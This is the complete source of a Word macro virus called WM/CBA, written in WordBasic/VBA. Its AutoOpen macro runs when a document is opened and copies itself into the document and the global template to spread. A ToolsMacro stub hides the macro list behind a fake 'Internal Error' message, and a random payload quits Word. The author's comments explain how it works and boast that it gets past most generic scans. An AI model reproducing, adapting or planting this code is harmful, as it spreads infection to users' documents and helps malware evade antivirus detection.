   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "ToolsMacro"


   Public Sub MAIN()
   WordBasic.MsgBox "Internal Error"
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()

   ' Welcome to the WM/CBA Virus.

   ' Skip to the end for some important messages...

   ' For those of you in AV or wannabe virus writers, here's how
   ' this works.

   'Turns screen updating off, to minimize the things going on
   ' on screen.

   'Actually opens this code and edit|copies it.

   ' then opens the macro in the document and global template
   ' and pastes it in. This gets past about 95% of generic scans.

   'Then chooses rnd numb and exectues the payload. Easy peasy!

   WordBasic.ScreenUpdating 0
   WordBasic.FileSaveAs WordBasic.[FileName$](), 1

   WordBasic.ToolsMacro Name:="AutoOpen", Edit:=1, Show:=0, Description:="", NewName:=""
   WordBasic.EditSelectAll
   WordBasic.EditCopy
   WordBasic.DocClose 1

   WordBasic.ToolsMacro Name:="AutoOpen", Edit:=1, Show:=1, Description:="", NewName:=""
   WordBasic.EditSelectAll
   WordBasic.EditPaste
   WordBasic.DocClose 1

   WordBasic.ToolsMacro Name:="AutoOpen", Edit:=1, Show:=3, Description:="", NewName:=""
   WordBasic.EditSelectAll
   WordBasic.EditPaste
   WordBasic.DocClose 1

   WordBasic.ToolsMacro Name:="ToolsMacro", Edit:=1, Show:=0, Description:="", NewName:=""
   WordBasic.EditSelectAll
   WordBasic.EditCopy
   WordBasic.DocClose 1

   WordBasic.ToolsMacro Name:="ToolsMacro", Edit:=1, Show:=1, Description:="", NewName:=""
   WordBasic.EditSelectAll
   WordBasic.EditPaste
   WordBasic.DocClose 1

   WordBasic.ToolsMacro Name:="ToolsMacro", Edit:=1, Show:=3, Description:="", NewName:=""
   WordBasic.EditSelectAll
   WordBasic.EditPaste
   WordBasic.DocClose 1

   WordBasic.FileSaveAs WordBasic.[FileName$](), 1

   If WordBasic.Int(Rnd() * 100) = 42 Then WordBasic.MsgBox "Oh, I Can't Be Arsed!", "CBA": WordBasic.FileQuit 2


   'This macro virus was created by...
   '
   ' __
   '/  \   THE
   '|  | ____  ____ _   _  _  _____ _  ____  ____  _____
   '|  |/    \/ __ \ | | |/ \/ ___// \/    \/    \/  __/
   '|  |  /\ |  \/ | |_| || |\___ \| | |  ||  [] |  |
   '\__/\_||_/\__  |_____|\_/\____/\_/ |__| \____/__|
   '             | |
   '             | |__
   '             |___/
   '
   ' A big HI! to :
   '
   '  AVP
   '  Symantec
   '  DrWeb
   '
   ' Those seem to be the only guys to list WM/Query (Inquisitor3)
   '
   ' /**************************************************************\
   ' *  Hi to everyone at Mcafee / Solomons - whose VShield I was   *
   ' *                running while writing this virus.             *
   ' \**************************************************************/
   '



   End Sub
